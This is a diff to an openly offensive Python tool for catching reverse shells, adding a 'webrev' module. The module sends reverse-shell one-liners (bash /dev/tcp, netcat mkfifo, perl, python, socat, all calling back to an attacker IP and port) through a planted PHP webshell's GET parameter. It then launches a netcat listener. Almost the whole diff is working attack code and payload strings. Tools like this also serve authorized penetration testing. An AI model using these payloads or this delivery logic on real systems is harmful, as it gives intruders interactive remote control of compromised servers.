@@ -10,6 +10,7 @@ import re
 import random
 import sys
 import requests
+import threading
 
 if os.name.lower() == "nt":
     aerr("Sorry!!! But this script could be run on Linux only.")
@@ -42,7 +43,7 @@ parser = argparse.ArgumentParser(description=f"""
 /____/_/ /_/\___/_/\__/\___/_/     
 
 {end}{bold}{red}To boldly catch shells even the size of a meteorite.      
-{end}{bold}{orange}Version: v1.1.2 - 19/04/21 - Bides Das @Xyan1d3 {end}""",formatter_class=argparse.RawTextHelpFormatter)
+{end}{bold}{orange}Version: v1.2.0 - 19/04/21 - Bides Das @Xyan1d3 {end}""",formatter_class=argparse.RawTextHelpFormatter)
 
 subparser = parser.add_subparsers(title="Available Modules", dest="module")
 rev = subparser.add_parser("rev",help="Revshell to clipboard")
@@ -108,10 +109,71 @@ socat.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
 
 web.add_argument("url",help="Target URL [http://127.0.0.1/cmd.php]",metavar="URL")
 web.add_argument("-f",help="Filename of the webshell [Default : cmd.php]. Incase you enter only ip in url arg.")
-web.add_argument("-p",help="GET parameter to send commands.[Default: cmd]")
+web.add_argument("-param",help="GET parameter to send commands.[Default: cmd]")
 web.add_argument("--ssl",help="Force HTTPS",action="store_true")
 web.add_argument("--nossl",help="Force downgrade to HTTP",action="store_true")
 
+webrev.add_argument("url",help="Target URL [http://127.0.0.1/cmd.php]",metavar="URL")
+
+nwebrev = webrev.add_subparsers(title="Available Payloads",dest='sub',help=False)
+webrev.add_argument("-f",help="Filename of the webshell [Default : cmd.php]. Incase you enter only ip in url arg.")
+webrev.add_argument("-param",help="GET parameter to send commands.[Default: cmd]")
+webrev.add_argument("--ssl",help="Force HTTPS",action="store_true")
+webrev.add_argument("--nossl",help="Force downgrade to HTTP",action="store_true")
+
+wbash = nwebrev.add_parser("bash",help="echo base64_encoded_bash-i_payload |base64 -d|bash")
+wbashi = nwebrev.add_parser("bashi",help="bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1")
+wbash196 = nwebrev.add_parser("bash196",help="0<&196;exec 196<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT; bash <&196 >&196 2>&196")
+wbashrl = nwebrev.add_parser("bashrl",help="exec 5<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT;cat <&5 | while read line; do $line 2>&5 >&5; done")
+wbash5 = nwebrev.add_parser("bash5",help="bash -i 5<> /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0<&5 1>&5 2>&5")
+wbashudp = nwebrev.add_parser("bashudp",help="bash -i >& /dev/udp/ATTACKER_IP/ATTACKER_PORT 0>&1")
+wnc_mkfifo = nwebrev.add_parser("nc_mkfifo",help="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f")
+wperl = nwebrev.add_parser("perl",help="""perl -e 'use Socket;$i="ATTACKER_IP";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'""")
+wpy2 = nwebrev.add_parser("py2",help="""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""")
+wpy = nwebrev.add_parser("py",help="""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""")
+wpy2export = nwebrev.add_parser("py2export",help="""export RHOST="ATTACKER_IP";export RPORT=ATTACKER_PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""")
+wpyexport = nwebrev.add_parser("pyexport",help="""export RHOST="ATTACKER_IP";export RPORT=ATTACKER_PORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")""")
+wsocat = nwebrev.add_parser("socat",help="socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:'bash',pty,stderr,setsid,sigint,sane")
+
+wbash.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wbashi.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wbash196.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wbashrl.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wbash5.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wbashudp.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wnc_mkfifo.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wperl.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wpy2.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wpy.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wpy2export.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wpyexport.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wsocat.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+wbash.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wbashi.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wbash196.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wbashrl.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wbash5.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wbashudp.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wnc_mkfifo.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wperl.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wpy2.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wpy.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wpy2export.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wpyexport.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wsocat.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+wbash.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
+wbashi.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
+wbash196.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
+wbashrl.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
+wbash5.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
+wbashudp.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
+wnc_mkfifo.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
+wperl.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
+wpy2.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
+wpy.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
+wpy2export.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
+wpyexport.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
+wsocat.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
 
 args = parser.parse_args()
 
@@ -149,11 +211,11 @@ def shell_cpy(language,ATTACKER_IP,ATTACKER_PORT): # This function takes attacke
     
     payloads = {
     "bash" : f"echo {bashi_b64} |base64 -d|bash",
-    "bashi" : f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1",
-    "bash196" : f"0<&196;exec 196<>/dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT}; bash <&196 >&196 2>&196",
-    "bashrl" : f"exec 5<>/dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
-    "bash5" : f"bash -i 5<> /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0<&5 1>&5 2>&5",
-    "bashudp" : f"bash -i >& /dev/udp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1",
+    "bashi" : f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'",
+    "bash196" : f"bash -c '0<&196;exec 196<>/dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT}; bash <&196 >&196 2>&196'",
+    "bashrl" : f"bash -c 'exec 5<>/dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT};cat <&5 | while read line; do $line 2>&5 >&5; done'",
+    "bash5" : f"bash -c 'bash -i 5<> /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0<&5 1>&5 2>&5'",
+    "bashudp" : f"bash -c 'bash -i >& /dev/udp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'",
     "nc_mkfifo" : f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ATTACKER_IP} {ATTACKER_PORT} >/tmp/f",
     "perl" : """perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'""" % (ATTACKER_IP,ATTACKER_PORT),
     "py2" : f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
@@ -198,18 +260,34 @@ def Invoke_Webshell(url): # This will invoke a webshell when a url with param is
         print(f"{end}",end="")
         r = requests.get(f"{url}{requests.utils.quote(cmd)}") # It will send the url encoded command and url encoded to the url as a GET parameter.
         print(r.text.rstrip()) # We print the response of the command on the screen while removing a extra trailling line sing rstrip.
-        
+def Invoke_Revshell(url,language):
+    proxies = {
+  'https': 'https://127.0.0.1:8080',
+}
+    try:   # Here it checks wether the site is available or not
+        r = requests.get(f"{url}")
+        if "404" in r.text or "Not Found" in r.text: # Added check if the named site is not available which returns not found by webserver.
+            aerr(f"Fatal Error : 404 Page not found.")
+            exit()
+    except requests.ConnectionError: # If the site is unavailable it will return an 404.
+        aerr(f"Fatal Error : 404 Page not found.")
+        exit()
+    ap(f"Sending payload {language}")
+    try:
+        r = requests.get(f"{url}{requests.utils.quote(language)}",proxies=proxies)
+    except requests.Timeout:
+        return
 def shell_handler(port,proto): # shell_handler invokes a netcat listener it takes port to listen on and protocol UDP/TCP
     if proto.lower() == "tcp":
-        os.system(f"nc -lvnp {fetch_port()}") # Invoking netcat as TCP listener
+        os.system(f"nc -lvnp {port}") # Invoking netcat as TCP listener
     elif proto.lower() == "udp":
-        os.system(f"nc -luvnp {fetch_port()}") # Invoking netcat with UDP support
-
+        os.system(f"nc -luvnp {port}") # Invoking netcat with UDP support
 
 
 
 if len(sys.argv) == 1: # If no arguments are supplied then the this will print the arg parser help.
     parser.print_help()
+    exit()
 try:
     if args.module == "rev": # Checks for 1st pos arg if its rev.
         if args.sub in list(rev_sub.choices.keys()): # Checks if the 2nd pos arg is valid language for revshell payload.
@@ -269,13 +347,73 @@ try:
                     elif args.f != None: # If -f arg is supplied it will inject the filename from the parameter and put it in the url.
                         args.url += args.f
                 if bool(re.match("^(http://|https://)[a-zA-Z0-9./]+$",args.url)): # Checks if the url has the args parameter present else injects ?cmd= or the data added with -p flag.
-                    if args.p == None: # It checks for the -p flag if the parameter is not supplied it on default will add ?cmd= to url.
+                    if args.param == None: # It checks for the -p flag if the parameter is not supplied it on default will add ?cmd= to url.
                         args.url += "?cmd="
-                    elif args.p != None: # If the -f flag is supplied it will be injected to the url as a parameter ?arg=
-                        args.url += f"?{args.p}="
+                    elif args.param != None: # If the -f flag is supplied it will be injected to the url as a parameter ?arg=
+                        args.url += f"?{args.param}="
         # The url is prepared for doing whatever we want to do.
         Invoke_Webshell(args.url)
-
+    if args.module == "webrev":
+        if not bool(re.match("^http://|https://",args.url)) and not bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/$",args.url)):
+            if args.ssl and args.nossl:
+                aerr(f"{bold}{white}A tight slap to you for slapping --ssl & --nossl together.")
+                exit()
+            elif args.ssl:
+                args.url = "https://" + args.url
+            elif args.nossl or not args.ssl and not args.nossl:
+                args.url = "http://" + args.url
+        if bool(re.match("^http://|https://",args.url)): # Checks whether http or https is present in the url entered.
+            if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+$",args.url)): # This if regex checks for url like http://127.0.0.1 and makes them http://127.0.0.1/
+                args.url += "/"
+            if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/",args.url)): # This if regex checks for url like https://127.0.0.1/ or http://127.0.0.1/
+                if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/$",args.url)): # This regex checks if it has the filename path in the url else it injects cmd.php of the -f parameter.
+                    if args.f == None: # Checks for the -f arg for filename if not supplied it puts default cmd.php there.
+                        args.url += "cmd.php"
+                    elif args.f != None: # If -f arg is supplied it will inject the filename from the parameter and put it in the url.
+                        args.url += args.f
+                if bool(re.match("^(http://|https://)[a-zA-Z0-9./]+$",args.url)): # Checks if the url has the args parameter present else injects ?cmd= or the data added with -p flag.
+                    if args.param == None: # It checks for the -p flag if the parameter is not supplied it on default will add ?cmd= to url.
+                        args.url += "?cmd="
+                    elif args.param != None: # If the -f flag is supplied it will be injected to the url as a parameter ?arg=
+                        args.url += f"?{args.param}="
+        if args.sub in list(rev_sub.choices.keys()): # Checks if the 2nd pos arg is valid language for revshell payload.
+            #if args.i == None and args.p == None:
+            #    args.nohandler == True
+            if args.i != None: # Checks if IP is supplied via arg and check if it is a valid IP using regex.
+                check = bool(re.match("^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",args.i))
+                if not check: # Exits the script of the IP is not valid.
+                    aerr(f"Fatal Error : {args.i} is not a valid ipv4 address")
+                    exit()
+            if args.p != None: # Checks if port is supplied via arg and checks if it is in the valid port range.
+                if int(args.p) >= 65535 or int(args.p) < 0:
+                    aerr(f"Fatal Error : {args.p} is not a valid port number.")
+                    exit()
+            if args.i == None: # Using predefined variable to store the ip if not found by args.
+                args.i = fetch_ip()
+            if args.p == None: # Using predefined variable to store the port if not found by args.
+                args.p = fetch_port()
+            if args.p == 80 or args.p == 443 :
+                port_choice_troll = ["Trying to slip through Firewall, You Naughty ;)","Time to be Sneaky Beaky Like...","Let's be a ghost for now.","Shh!! Firewall is sleeping, Better not wake him up."]
+                ap(f"{orange}{bold}{random.choice(port_choice_troll)}{end}")
+            payload = shell_cpy(args.sub,args.i,args.p) # It will take 2nd positional args as language and store it in a variable.
+            #Invoke_Revshell(args.url,payload) # Will copy the revshell payload into the clipboard.
+            threading.Timer(1,Invoke_Revshell,[args.url,payload]).start()
+            if not args.nohandler: # It checks if the --nohandler flag not is supplied.
+                ap("Starting up Shell Handler...")
+                if "udp".lower() in payload.lower(): # Checks if udp is present in the revshell then starts netcat with udp support
+                    shell_handler(args.p,"udp") # Invokes netcat listener with UDP support.
+                else:
+                    shell_handler(args.p,"tcp") # Invokes netcat listener on tcp mode.
+            else: # It will take place when --nohandler flag is supplied.
+                ainfo("No Handler flag detected. Handler will not be started.")
+    else: # If not argument is added after rev then it automatically falls back to bash base64'ed bash revshell.
+        ainfo("No Payload specified : Falling back to base64 encoded bash -i revshell")
+        ap("Starting up Shell Handler...")
+        payload = shell_cpy("bash",fetch_ip(),fetch_port())
+        threading.Timer(1,Invoke_Revshell,[args.url,payload]).start()
+        shell_handler(fetch_port(),"tcp")
 except KeyboardInterrupt: # The whole program is in the try block with the error handling of ctrl-c and prints the KTHXBYE
+    
     print()
     ainfo("KTHXBYE!") # This message is inspired from earlier version of https://github.com/byt3bl33d3r/CrackMapExec
+    sys.exit()
